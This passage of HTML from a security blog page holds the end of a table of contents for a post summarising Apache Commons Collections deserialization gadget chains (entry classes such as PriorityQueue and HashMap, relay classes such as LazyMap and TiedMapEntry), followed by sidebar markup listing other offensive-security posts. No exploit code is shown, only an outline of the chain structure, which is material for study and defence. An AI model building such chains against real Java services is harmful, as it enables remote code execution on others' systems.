href="#java-util-PriorityQueue"><span class="toc-number">10.1.1.1.</span> <span class="toc-text">java.util.PriorityQueue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readObject-hashCode"><span class="toc-number">10.1.2.</span> <span class="toc-text">readObject-&gt;hashCode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#java-util-HashMap"><span class="toc-number">10.1.2.1.</span> <span class="toc-text">java.util.HashMap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readObject-toString"><span class="toc-number">10.1.3.</span> <span class="toc-text">readObject-&gt;toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#javax-management-BadAttributeValueExpException"><span class="toc-number">10.1.3.1.</span> <span class="toc-text">javax.management.BadAttributeValueExpException</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readObject-equals"><span class="toc-number">10.1.4.</span> <span class="toc-text">readObject-&gt;equals</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#java-util-Hashtable"><span class="toc-number">10.1.4.1.</span> <span class="toc-text">java.util.Hashtable</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E8%BD%AC%E7%B1%BB"><span class="toc-number">10.2.</span> <span class="toc-text">中转类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashCode-get"><span class="toc-number">10.2.1.</span> <span class="toc-text">hashCode-&gt;get</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections-keyvalue-TiedMapEntry"><span class="toc-number">10.2.1.1.</span> <span class="toc-text">org.apache.commons.collections.keyvalue.TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-keyvalue-TiedMapEntry"><span class="toc-number">10.2.1.2.</span> <span class="toc-text">org.apache.commons.collections4.keyvalue.TiedMapEntry</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-get"><span class="toc-number">10.2.2.</span> <span class="toc-text">toString-&gt;get</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections-keyvalue-TiedMapEntry-1"><span class="toc-number">10.2.2.1.</span> <span class="toc-text">org.apache.commons.collections.keyvalue.TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-keyvalue-TiedMapEntry-1"><span class="toc-number">10.2.2.2.</span> <span class="toc-text">org.apache.commons.collections4.keyvalue.TiedMapEntry</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#equals-get"><span class="toc-number">10.2.3.</span> <span class="toc-text">equals-&gt;get</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections-keyvalue-TiedMapEntry-2"><span class="toc-number">10.2.3.1.</span> <span class="toc-text">org.apache.commons.collections.keyvalue.TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-keyvalue-TiedMapEntry-2"><span class="toc-number">10.2.3.2.</span> <span class="toc-text">org.apache.commons.collections4.keyvalue.TiedMapEntry</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-transform"><span class="toc-number">10.2.4.</span> <span class="toc-text">get-&gt;transform</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections-map-LazyMap"><span class="toc-number">10.2.4.1.</span> <span class="toc-text">org.apache.commons.collections.map.LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-map-LazyMap"><span class="toc-number">10.2.4.2.</span> <span class="toc-text">org.apache.commons.collections4.map.LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections-map-DefaultedMap"><span class="toc-number">10.2.4.3.</span> <span class="toc-text">org.apache.commons.collections.map.DefaultedMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-map-DefaultedMap"><span class="toc-number">10.2.4.4.</span> <span class="toc-text">org.apache.commons.collections4.map.DefaultedMap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-put"><span class="toc-number">10.2.5.</span> <span class="toc-text">get-&gt;put</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections-map-LazyMap-1"><span class="toc-number">10.2.5.1.</span> <span class="toc-text">org.apache.commons.collections.map.LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-map-LazyMap-1"><span class="toc-number">10.2.5.2.</span> <span class="toc-text">org.apache.commons.collections4.map.LazyMap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compare-transform"><span class="toc-number">10.2.6.</span> <span class="toc-text">compare-&gt;transform</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-apache-commons-collections4-comparators-TransformingComparator"><span class="toc-number">10.2.6.1.</span> <span class="toc-text">org.apache.commons.collections4.comparators.TransformingComparator</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#commons-collections-3-2-2%E4%B9%8B%E5%90%8E%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">11.</span> <span class="toc-text">commons-collections 3.2.2之后的区别</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 9
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span>
+            <a class="archive-post-title" href="/2023/11/19/CC%E9%93%BE/">CC链汇总</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span>
+            <a class="archive-post-title" href="/2023/11/18/%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87/">java反序列化引用绕过</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span>
+            <a class="archive-post-title" href="/2023/11/17/CVE-2023-4357/">Chrome任意文件读->外带</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span>
+            <a class="archive-post-title" href="/2023/11/16/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java序列化\反序列化流程分析</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span>
+            <a class="archive-post-title" href="/2023/11/15/java%E5%88%9B%E9%80%A0%E5%AF%B9%E8%B1%A1/">java创造对象</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span>
+            <a class="archive-post-title" href="/2023/11/14/k8s/">k8s攻防</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span>
+            <a class="archive-post-title" href="/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸 All in One</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span>
+            <a class="archive-post-title" href="/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">BUUCTF pwn刷题记录</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span>
+            <a class="archive-post-title" href="/index.html">Welcome</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="云安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                云安全
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="java">
+                <span class="iconfont-archer">&#xe606;</span>
+                java
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://azraelxuemo.github.io",
+        root: siteMetaRoot,
+        author: "azraelxuemo"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
